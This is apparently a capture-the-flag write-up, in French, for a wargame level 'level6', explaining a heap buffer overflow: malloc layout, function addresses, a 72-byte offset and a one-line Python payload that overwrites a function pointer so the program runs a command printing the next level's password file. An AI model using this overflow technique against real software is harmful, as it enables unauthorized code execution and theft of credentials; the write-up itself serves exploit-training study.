# level6 - Heap Buffer Overflow

## Analyse du Programme

**Structure Mémoire**
- Premier `malloc(64)` retourne `0x0804a008`
- Second `malloc(4)` retourne `0x0804a050`
- Les blocs mémoire sont contigus sur la heap
- Header malloc de 8 bytes entre chaque allocation

**Fonctions Importantes**
- Fonction `n()` à l'adresse `0x08048454` exécute `system("/bin/cat /home/user/level7/.pass")`
- Fonction `m()` à l'adresse `0x08048468` est appelée par défaut

## Exploitation

**Mécanisme**
- Le programme copie `argv` dans le premier buffer avec `strcpy()`
- L'overflow du premier buffer permet d'écraser l'adresse stockée dans le second malloc
- L'offset total est de 72 bytes (64 bytes du buffer + 8 bytes de header malloc)

**Construction du Payload**
```bash
./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
```

Le payload:
1. 72 bytes de padding ("A")
2. Adresse de `n()` en little-endian (`\x54\x84\x04\x08`)

**Obtention du Flag**
```bash
cat /home/user/level7/.pass
```

Cette exploitation fonctionne en écrasant l'adresse de `m()` par celle de `n()` dans le second bloc malloc, redirigeant ainsi l'exécution vers la fonction qui affiche le flag.

